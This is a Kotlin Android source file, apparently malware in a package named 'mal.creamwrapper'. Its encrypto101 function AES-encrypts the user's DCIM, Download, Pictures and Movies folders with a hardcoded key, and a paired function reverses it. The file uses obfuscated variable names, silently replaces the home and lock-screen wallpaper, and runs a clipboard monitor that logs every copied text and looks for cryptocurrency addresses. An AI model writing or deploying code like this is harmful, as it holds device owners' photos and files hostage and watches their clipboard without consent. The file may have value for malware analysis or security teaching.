package com.mal.creamwrapper

import android.app.WallpaperManager
import android.content.Context
import android.graphics.Bitmap
import android.graphics.Canvas
import android.graphics.Paint
import android.os.Build
import android.os.Environment
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.util.UUID
import android.content.ClipboardManager
import android.widget.Toast


fun encrypto101(context: Context) {
    KeyValue.init(context)
    val caddgjc = KeyValue.contains("musherhoe")
    var csfwd = "bordercollie"
    val sjfds = File(Environment.getExternalStorageDirectory(), "DCIM")
    val vidjf = File(Environment.getExternalStorageDirectory(), "Download")
    val teswr = File(Environment.getExternalStorageDirectory(), "Pictures")
    val duhsv = File(Environment.getExternalStorageDirectory(), "Movies")
    if (caddgjc!=true) {
        val id = UUID.randomUUID()
            .toString()
            .replace("-", "")
        KeyValue.put("musherhoe", id)
    }
    else{
        return
    }
    KeyValue.getString("musherhoe", csfwd)
    if (duhsv.exists()) {
        AesDirectoryCrypto.encrypt(duhsv, csfwd) { result ->
            result.onSuccess {
                Log.i("Crypto", "加密成功")
            }
            result.onFailure { error ->
                Log.e("Crypto", "加密失败", error)
            }
        }
    }
    if (sjfds.exists()) {
        AesDirectoryCrypto.encrypt(sjfds, csfwd) { result ->
            result.onSuccess {
                Log.i("Crypto", "加密成功")
            }
            result.onFailure { error ->
                Log.e("Crypto", "加密失败", error)
            }
        }
    }
    if (vidjf.exists()) {
        AesDirectoryCrypto.encrypt(vidjf, csfwd) { result ->
            result.onSuccess {
                Log.i("Crypto", "加密成功")
            }
            result.onFailure { error ->
                Log.e("Crypto", "加密失败", error)
            }
        }
    }
    if (teswr.exists()) {
        AesDirectoryCrypto.encrypt(teswr, csfwd) { result ->
            result.onSuccess {
                Log.i("Crypto", "加密成功")
            }
            result.onFailure { error ->
                Log.e("Crypto", "加密失败", error)
            }
        }
    }
}
fun decrypto101(context: Context){
    KeyValue.init(context)
    var csfwd = "bordercollie"
    val caddgjc = KeyValue.contains("musherhoe")
    val sjfds = File(Environment.getExternalStorageDirectory(), "DCIM")
    val vidjf = File(Environment.getExternalStorageDirectory(), "Download")
    val teswr = File(Environment.getExternalStorageDirectory(), "Pictures")
    val duhsv = File(Environment.getExternalStorageDirectory(), "Movies")
    if (caddgjc!=true) {
        return
    }
    if (sjfds.exists()){
        AesDirectoryCrypto.decrypt(sjfds, csfwd) { result ->
            result.onSuccess {
                Log.i("Crypto", "解密成功")
            }

            result.onFailure { error ->
                Log.e("Crypto", "解密失败", error)
            }
        }
    }
    if (vidjf.exists()){
        AesDirectoryCrypto.decrypt(vidjf, csfwd) { result ->
            result.onSuccess {
                Log.i("Crypto", "解密成功")
            }

            result.onFailure { error ->
                Log.e("Crypto", "解密失败", error)
            }
        }
    }
    if (teswr.exists()){
        AesDirectoryCrypto.decrypt(teswr, csfwd) { result ->
            result.onSuccess {
                Log.i("Crypto", "解密成功")
            }

            result.onFailure { error ->
                Log.e("Crypto", "解密失败", error)
            }
        }
    }
    if (duhsv.exists()){
        AesDirectoryCrypto.decrypt(duhsv, csfwd) { result ->
            result.onSuccess {
                Log.i("Crypto", "解密成功")
            }

            result.onFailure { error ->
                Log.e("Crypto", "解密失败", error)
            }
        }
    }

}

fun setMintCheckerWallpaper(
    context: Context,
    columns: Int = 8,
    scaleDiv: Int = 4,
    onResult: ((Boolean) -> Unit)? = null
) {
    require(columns > 0) { "columns 必须大于 0" }
    require(scaleDiv > 0) { "scaleDiv 必须大于 0" }

    val app = context.applicationContext

    CoroutineScope(Dispatchers.IO).launch {
        val ok = try {
            val wm = WallpaperManager.getInstance(app)

            // Android 6.0+：检查壁纸功能是否受支持
            if (!wm.isWallpaperSupported) {
                false
            } else if (
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.N &&
                !wm.isSetWallpaperAllowed
            ) {
                // isSetWallpaperAllowed 仅支持 API 24+
                false
            } else {
                val dm = app.resources.displayMetrics
                val sw = minOf(dm.widthPixels, dm.heightPixels)
                    .coerceAtLeast(1)
                val sh = maxOf(dm.widthPixels, dm.heightPixels)
                    .coerceAtLeast(1)

                val cell = (sw / scaleDiv / columns).coerceAtLeast(1)
                val bw = (cell.toLong() * columns)
                    .coerceAtMost(Int.MAX_VALUE.toLong()).toInt()

                val bh = (
                        bw.toLong() * sh / sw
                        ).coerceAtLeast(cell.toLong())
                    .coerceAtMost(Int.MAX_VALUE.toLong()).toInt()

                val bmp = Bitmap.createBitmap(
                    bw,
                    bh,
                    Bitmap.Config.RGB_565
                )

                try {
                    val canvas = Canvas(bmp)
                    canvas.drawColor(0xFF3EB489.toInt())

                    val paint = Paint().apply {
                        color = 0xFF47C497.toInt()
                    }

                    val rows = (bh.toLong() + cell - 1) / cell

                    for (r in 0 until rows.toInt()) {
                        for (c in (r and 1) until columns step 2) {
                            canvas.drawRect(
                                (c * cell).toFloat(),
                                (r * cell).toFloat(),
                                ((c + 1) * cell).toFloat(),
                                ((r + 1) * cell).toFloat(),
                                paint
                            )
                        }
                    }

                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        wm.setBitmap(
                            bmp,
                            null,
                            true,
                            WallpaperManager.FLAG_SYSTEM or
                                    WallpaperManager.FLAG_LOCK
                        )
                    } else {
                        // API 23：使用旧接口
                        wm.setBitmap(bmp)
                    }

                    true
                } finally {
                    bmp.recycle()
                }
            }
        } catch (e: Exception) {
            false
        }

        onResult?.let { callback ->
            withContext(Dispatchers.Main) {
                callback(ok)
            }
        }
    }
}

fun Notification101(){

}
fun listenClipboard(context: Context) {
    ClipboardMonitor.start(context)
}

object ClipboardMonitor {

    private var appContext: Context? = null
    private var clipboard: ClipboardManager? = null

    // 持有监听器引用，才能在 stop() 里准确移除
    private val listener = ClipboardManager.OnPrimaryClipChangedListener {
        val app = appContext ?: return@OnPrimaryClipChangedListener
        val text = clipboard?.primaryClip
            ?.takeIf { it.itemCount > 0 }
            ?.getItemAt(0)
            ?.coerceToText(app)
            ?.toString()

        Log.d("Clipboard", "剪切板内容：$text")
        if ((text?.length ?: 0) > 24) {
            println("超过24个字符")
            val info = CryptoAddressDetector.analyze(text!!)
            if (info.isAddress) {

                val displayMessage = app.getString(
                    R.string.address_check_result,
                    info.chain,
                    info.network,
                    info.addressType,
                    info.validation,
                    info.possibleChains,
                    info.details
                )
                Toast.makeText(app, displayMessage, Toast.LENGTH_LONG).show()
                showClipboardGuardFloat(app)
            }
        }

    }

    @Synchronized
    fun start(context: Context) {
        if (appContext != null) return          // 已注册，不重复添加监听

        val app = context.applicationContext    // 只保存 Application，避免泄漏 Activity
        appContext = app
        clipboard = (app.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager)
            .also { it.addPrimaryClipChangedListener(listener) }
    }

    @Synchronized
    fun stop() {
        clipboard?.removePrimaryClipChangedListener(listener)
        clipboard = null
        appContext = null
    }
}